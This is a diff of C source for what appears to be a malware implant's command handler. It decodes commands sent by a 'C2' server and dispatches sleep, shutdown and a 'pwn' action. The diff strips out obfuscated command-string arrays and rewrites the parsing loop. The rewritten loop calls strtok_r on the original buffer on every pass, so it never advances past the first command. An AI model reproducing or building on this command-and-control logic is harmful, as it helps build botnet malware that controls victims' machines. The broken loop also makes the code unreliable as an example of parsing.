@@ -14,12 +14,6 @@ static void doPawn();
 static int extractN(char* cmdStr);
 
 
-// obfuscated command strings
-static const char SLP[3] = {'s','l','p'};
-static const char SHD[3] = {'s','h','d'};
-static const char PWN[3] = {'p','w','n'};
-
-
 /**
  * split the cmds based upon newline characters. Then execute each one sequentially.
  * NOTE: if we detect the commands were incorectly encoded its likely due to the C2
@@ -29,16 +23,15 @@ ERR_CODE processCommands(CLIENT_HANDLER* client) {
     if (strlen(client->cmdBuffer) == 0) { return ECODE_EMPTY_BUFFER; } // no commands
 
     char* saveState;
-    char* line = strtok_r(client->cmdBuffer, "\n", &saveState);
+    char* line;
     
     // we check for shutdown here in case theere are commands after the shd
-    while (line != NULL) {
+    while ((line = strtok_r(client->cmdBuffer, "\n", &saveState)) != NULL) {
         ERR_CODE ret = executeCommand(line, client->ENC_KEY);
+
         // if shutdown, or the commands were incorrectly encoded then exit!
         if (ret == ECODE_DO_SHUTDOWN)   { return ECODE_DO_SHUTDOWN; }
         if (ret == ECODE_INCORRECT_ENC) { return ECODE_INCORRECT_ENC; }
-
-        line = strtok_r(NULL, "\n", &saveState);
     }
     return ECODE_SUCCESS;
 }
@@ -52,18 +45,18 @@ static ERR_CODE executeCommand(char* cmdStr, unsigned char key) {
     encode(cmdStr, &key);
     printf("\nDECODED CMD: '%s'\n", cmdStr);
     
-    if (strncmp(cmdStr, SLP, 3) == 0) {
-        progContext->sleeping = TRUE;
+    if (strncmp(cmdStr, "slp", 3) == 0) {
+        ctx->sleeping = TRUE;
         doSleep(extractN(cmdStr + 3));
-        progContext->sleeping = FALSE;
+        ctx->sleeping = FALSE;
 
         return ECODE_SUCCESS;
     } 
-    if (strncmp(cmdStr, SHD, 3) == 0) {
-        progContext->shutdown = TRUE;
+    if (strncmp(cmdStr, "shd", 3) == 0) {
+        ctx->shutdown = TRUE;
         return ECODE_DO_SHUTDOWN;
     } 
-    if (strncmp(cmdStr, PWN, 3) == 0) {
+    if (strncmp(cmdStr, "pwn", 3) == 0) {
         doPawn();
         return ECODE_SUCCESS;
     }
